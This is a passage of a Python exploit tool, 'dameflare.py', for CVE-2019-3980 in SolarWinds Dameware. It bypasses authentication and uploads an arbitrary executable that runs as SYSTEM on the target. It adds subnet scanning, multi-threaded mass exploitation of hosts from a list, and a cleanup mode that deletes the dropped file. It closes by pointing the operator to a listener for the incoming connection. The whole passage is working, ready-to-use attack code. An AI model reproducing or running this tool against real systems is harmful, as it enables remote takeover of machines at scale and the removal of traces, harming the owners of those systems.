                _os.unlink(tmp_exe)

        success(f"Cleanup EXE built ({len(cleanup_exe):,} bytes)")
        info("Uploading cleanup EXE as dwDrvInst.exe ...")
        req = pack('<III', MSG_SMARTCARD_COMMAND, 2, len(cleanup_exe)) + cleanup_exe
        s.sendall(req)
        success("Cleanup payload transmitted!")
        info("Payload will delete C:\\Windows\\Temp\\dwDrvInst.exe and itself after a 2s delay")
        info(f"Target: {target}")

        # Brief response check
        try:
            s.settimeout(5)
            res = s.recv(0x4000)
            if res and verbose:
                dump("Response after cleanup delivery", res)
        except socket.timeout:
            pass
        except Exception:
            pass

    success("Cleanup complete!")
    return True


# ══════════════════════════════════════════════════════════════════════════════
# EXPLOIT
# ══════════════════════════════════════════════════════════════════════════════

def exploit(target, port, payload_path, timeout=10, verbose=False, auth_type=3):
    """
    Execute full CVE-2019-3980 exploitation.

    Raises ExploitError on protocol failures — never calls sys.exit() so it
    is safe to call from worker threads in multi-target mode.

    The socket is managed via contextlib.closing so it is always released
    regardless of which code path exits the function.
    """

    info(f"Connecting to {target}:{port} ...")

    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock.settimeout(timeout)

    with contextlib.closing(raw_sock) as s:
        try:
            s.connect((target, port))
        except Exception as e:
            raise ExploitError(f"Connection failed: {e}")

        success(f"Connected to {target}:{port}")

        _do_handshake(s, target, verbose=verbose, auth_type=auth_type)

        # ── STEP 11: Upload payload ───────────────────────────────────────────
        info(f"Loading payload: {payload_path} ...")
        try:
            with open(payload_path, 'rb') as f:
                payload_data = f.read()
        except Exception as e:
            raise ExploitError(f"Failed to load payload: {e}")

        success(f"Payload loaded ({len(payload_data):,} bytes)")
        info("Sending malicious dwDrvInst.exe via MSG_SMARTCARD_COMMAND ...")
        req = pack('<III', MSG_SMARTCARD_COMMAND, 2, len(payload_data)) + payload_data
        s.sendall(req)
        success("Payload transmitted!")
        info(f"Upload path: C:\\Windows\\Temp\\dwDrvInst.exe")
        info(f"Expected execution context: SYSTEM on {target}")

        # ── STEP 12: Server response ──────────────────────────────────────────
        info("Checking server response ...")
        try:
            s.settimeout(5)
            res = s.recv(0x4000)
            if res:
                if verbose:
                    dump("Response after payload delivery", res)
                if len(res) > 0x900:
                    try:
                        error_msg = res[0x840:0xa00].decode('utf-16-le', errors='ignore')
                        if "System Error" in error_msg or "System Message" in error_msg:
                            warn("Payload execution error detected:")
                            print(f"  {YELLOW}\"{error_msg.strip()}\"{RESET}")
                            warn("Possible causes: arch mismatch, missing DLLs, AV/EDR block, corruption")
                            return False
                    except Exception:
                        pass
            else:
                info("No immediate response from server")
        except socket.timeout:
            info("No response from server (timed out)")
        except Exception as e:
            warn(f"Error reading response: {e}")

    # Socket closed by contextlib.closing here, on all code paths
    success("Exploitation complete!")
    return True


# ══════════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════════

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description='CVE-2019-3980: SolarWinds Dameware RCE via Smart Card Authentication Bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
MODES:
  Exploit mode        Single target or multi-target payload delivery
  Scan mode           Enumerate a subnet/range for exposed Dameware services

SINGLE-TARGET EXPLOIT:
  python3 dameflare.py -t 192.168.1.50 -e payload.exe
  python3 dameflare.py -t 192.168.1.50 -e beacon.exe -v
  python3 dameflare.py -t 10.0.0.100   -e payload.exe -p 6130 -T 15

MULTI-TARGET EXPLOIT (targets file from scan -o output):
  python3 dameflare.py -f vuln_hosts.txt -e payload.exe
  python3 dameflare.py -f vuln_hosts.txt -e beacon.exe --threads 5
  python3 dameflare.py -f vuln_hosts.txt -e payload.exe --threads 10 -v

SCAN + EXPLOIT PIPELINE:
  python3 dameflare.py --scan -t 192.168.1.0/24 -o vuln_hosts.txt
  python3 dameflare.py -f vuln_hosts.txt -e payload.exe --threads 5

CLEANUP (remove dwDrvInst.exe artifact from target):
  python3 dameflare.py -t 192.168.1.50 --cleanup
  python3 dameflare.py -f vuln_hosts.txt --cleanup
  python3 dameflare.py -t 192.168.1.50 --cleanup -v

SCAN EXAMPLES:
  python3 dameflare.py --scan -t 192.168.1.0/24
  python3 dameflare.py --scan -t 10.0.0.1-50
  python3 dameflare.py --scan -t 192.168.1.0/24 --scan-threads 50 -o vuln_hosts.txt
  python3 dameflare.py --scan -t 10.0.0.1,10.0.1.1,10.0.2.1
  python3 dameflare.py --scan -f port6129.txt
  python3 dameflare.py --scan -f port6129.txt -o vuln_hosts.txt

        '''
    )

    parser.add_argument('-t', '--target',  required=False, default=None,
                        help='Target IP, CIDR, dash range (192.168.1.1-50), or comma list')
    parser.add_argument('-p', '--port',    type=int, default=6129,
                        help='DWRCS.exe port (default: 6129)')
    parser.add_argument('-T', '--timeout', type=int, default=10,
                        help='Socket timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output with hex dumps')
    parser.add_argument('-A', '--auth-type', type=int, default=3,
                        help='Auth type to request in version handshake (default: 3). Try 2,4,8 if rejected with 0xA410')

    exploit_group = parser.add_argument_group('Exploit mode')
    exploit_group.add_argument('-e', '--exe',
                        help='Payload executable to upload as dwDrvInst.exe')
    exploit_group.add_argument('-f', '--targets-file',
                        help='File containing one target IP per line (multi-target mode)')
    exploit_group.add_argument('--threads', type=int, default=1,
                        help='Thread count for multi-target exploit (default: 1 sequential)')
    exploit_group.add_argument('--cleanup', action='store_true',
                        help='Upload self-deleting cleanup payload to remove dwDrvInst.exe from target')

    scan_group = parser.add_argument_group('Scan mode')
    scan_group.add_argument('--scan',         action='store_true',
                        help='Run in scan mode — enumerate targets for Dameware service')
    scan_group.add_argument('--scan-threads', type=int, default=20,
                        help='Thread count for scan mode (default: 20)')
    scan_group.add_argument('-o', '--output',
                        help='Write confirmed-vulnerable hosts to file (scan mode)')

    args = parser.parse_args()

    # ── Scan mode ─────────────────────────────────────────────────────────────
    if args.scan:
        if args.targets_file:
            # -f supplied: load hosts from file, -t not required
            if not os.path.isfile(args.targets_file):
                fatal(f"Targets file not found: {args.targets_file}")
            scan_hosts = load_targets_file(args.targets_file)
            if not scan_hosts:
                fatal(f"No valid targets found in: {args.targets_file}")
            run_scan(None, args.port, args.timeout, args.scan_threads, args.output, hosts=scan_hosts)
        elif args.target:
            run_scan(args.target, args.port, args.timeout, args.scan_threads, args.output)
        else:
            parser.error("Scan mode requires -t/--target or -f/--targets-file.")
        sys.exit(0)

    # ── Cleanup mode ──────────────────────────────────────────────────────────
    if args.cleanup:
        if args.exe:
            parser.error("--cleanup and -e/--exe are mutually exclusive.")
        if not args.target and not args.targets_file:
            parser.error("Cleanup mode requires -t/--target or -f/--targets-file.")
        if args.targets_file:
            if not os.path.isfile(args.targets_file):
                fatal(f"Targets file not found: {args.targets_file}")
            hosts = load_targets_file(args.targets_file)
            if not hosts:
                fatal(f"No valid targets found in: {args.targets_file}")
            succeeded = failed = 0
            for host in hosts:
                try:
                    info(f"\n[~] Cleaning up {host} ...")
                    cleanup(host, args.port, args.timeout, args.verbose, args.auth_type)
                    succeeded += 1
                except ExploitError as e:
                    warn(f"Cleanup failed on {host}: {e}")
                    failed += 1
            print(f"\n{GREEN}[+]{RESET} Cleanup complete: {GREEN}{succeeded} succeeded{RESET}  |  {RED}{failed} failed{RESET}")
            sys.exit(0 if succeeded else 1)
        else:
            info(f"Cleanup target : {args.target}:{args.port}")
            try:
                cleanup(args.target, args.port, args.timeout, args.verbose, args.auth_type)
                print(f"\n{GREEN}{BOLD}[SUCCESS]{RESET} Cleanup payload delivered to {args.target}")
                sys.exit(0)
            except ExploitError as e:
                fatal(f"Cleanup failed: {e}")

    # ── Exploit mode: payload required ────────────────────────────────────────
    if not args.exe:
        parser.error("Exploit mode requires -e/--exe or --cleanup. Use --scan for scan-only mode.")
    if not os.path.isfile(args.exe):
        fatal(f"Payload file not found: {args.exe}")

    # ── Multi-target exploit ───────────────────────────────────────────────────
    if args.targets_file:
        if not os.path.isfile(args.targets_file):
            fatal(f"Targets file not found: {args.targets_file}")
        hosts = load_targets_file(args.targets_file)
        if not hosts:
            fatal(f"No valid targets found in: {args.targets_file}")
        try:
            succeeded, failed = run_multi_exploit(
                hosts, args.port, args.exe, args.timeout, args.threads, args.verbose, args.auth_type
            )
            sys.exit(0 if succeeded else 1)
        except KeyboardInterrupt:
            print(f"\n{RED}[!]{RESET} Interrupted by user")
            sys.exit(130)

    # ── Single-target exploit ─────────────────────────────────────────────────
    if not args.target:
        parser.error("Single-target mode requires -t/--target. Use -f for multi-target.")

    info(f"Payload  : {args.exe}  ({os.path.getsize(args.exe):,} bytes)")
    info(f"Target   : {args.target}:{args.port}  (timeout: {args.timeout}s)")
    print()

    try:
        result = exploit(args.target, args.port, args.exe, args.timeout, args.verbose, args.auth_type)
        if result:
            print(f"\n{GREEN}{BOLD}[SUCCESS]{RESET} Exploitation completed successfully!")
            print(f"{GREEN}Check your listener for an incoming connection from {args.target}{RESET}")
            sys.exit(0)
        else:
            print(f"\n{YELLOW}{BOLD}[PARTIAL]{RESET} Payload uploaded but execution may have failed")
            print(f"{YELLOW}Review the server response above for details{RESET}")
            sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{RED}[!]{RESET} Interrupted by user")
        sys.exit(130)
    except ExploitError as e:
        fatal(f"Exploitation failed: {e}")
    except Exception as e:
        fatal(f"Unexpected error: {e}")


if __name__ == '__main__':
    main()